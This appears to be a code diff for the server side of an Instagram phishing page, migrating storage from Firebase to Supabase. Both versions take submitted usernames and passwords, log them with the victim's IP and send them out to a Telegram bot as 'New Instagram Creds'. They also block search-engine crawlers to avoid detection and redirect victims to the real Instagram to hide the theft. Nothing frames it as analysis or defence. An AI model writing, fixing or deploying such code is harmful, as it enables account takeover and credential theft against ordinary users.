@@ -1,58 +1,67 @@
 const fetch = require('node-fetch');
-const admin = require('firebase-admin');
+const { createClient } = require('@supabase/supabase-js');
 
-// Initialize Firebase
-const serviceAccount = JSON.parse(process.env.FIREBASE_CREDENTIALS || '{}');
-admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount)
-});
-const db = admin.firestore();
+const supabaseUrl = process.env.SUPABASE_URL;
+const supabaseKey = process.env.SUPABASE_ANON_KEY;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 module.exports = async (req, res) => {
     // Block known bots
     const userAgent = req.headers['user-agent'] || '';
     const botPatterns = /Googlebot|bingbot|Baiduspider|SemrushBot|AhrefsBot/i;
     if (botPatterns.test(userAgent)) {
+        console.log('Bot detected:', userAgent);
         return res.status(403).json({ error: 'Forbidden' });
     }
 
     if (req.method === 'POST') {
-        // Parse form data
-        const { username, password } = req.body;
+        // Parse form data manually
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            const qs = require('querystring');
+            const { username, password } = qs.parse(body);
+            console.log('Parsed body:', { username, password });
 
-        if (!username || !password) {
-            return res.status(400).json({ error: 'Missing credentials' });
-        }
+            if (!username || !password) {
+                console.log('Missing credentials');
+                return res.status(400).json({ error: 'Missing credentials' });
+            }
 
-        // Prepare credential log
-        const log = {
-            username,
-            password,
-            time: new Date().toISOString(),
-            ip: req.headers['x-forwarded-for'] || 'unknown'
-        };
+            // Store in Supabase
+            const log = {
+                username,
+                password,
+                ip: req.headers['x-forwarded-for'] || 'unknown'
+            };
+            try {
+                const { error } = await supabase
+                    .from('credentials')
+                    .insert([log]);
+                if (error) throw error;
+                console.log('Credentials stored:', log);
+            } catch (error) {
+                console.error('Supabase error:', error);
+            }
 
-        // Store in Firestore
-        try {
-            await db.collection('credentials').add(log);
-            console.log('Credentials stored:', log);
-        } catch (error) {
-            console.error('Firestore error:', error);
-        }
+            // Send to Telegram
+            const telegramBotToken = 'YOUR_BOT_TOKEN';
+            const chatId = 'YOUR_CHAT_ID';
+            if (telegramBotToken && chatId) {
+                const message = encodeURIComponent(
+                    `New Instagram Creds:\nUsername: ${username}\nPassword: ${password}\nIP: ${log.ip}\nTime: ${new Date().toISOString()}`
+                );
+                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
+                await fetch(telegramUrl);
+                console.log('Telegram sent');
+            }
 
-        // Send to Telegram
-        const telegramBotToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-        const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
-        if (telegramBotToken && chatId) {
-            const message = encodeURIComponent(`New Instagram Creds:\nUsername: ${username}\nPassword: ${password}\nIP: ${log.ip}\nTime: ${log.time}`);
-            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-            await fetch(telegramUrl);
-        }
-
-        // Redirect to Instagram
-        res.redirect(302, 'https://www.instagram.com');
+            // Redirect to Instagram
+            console.log('Redirecting to Instagram');
+            res.redirect(302, 'https://www.instagram.com');
+        });
     } else {
-        // Redirect to index for non-POST requests
+        console.log('Non-POST request, redirecting to /');
         res.redirect(302, '/');
     }
 };
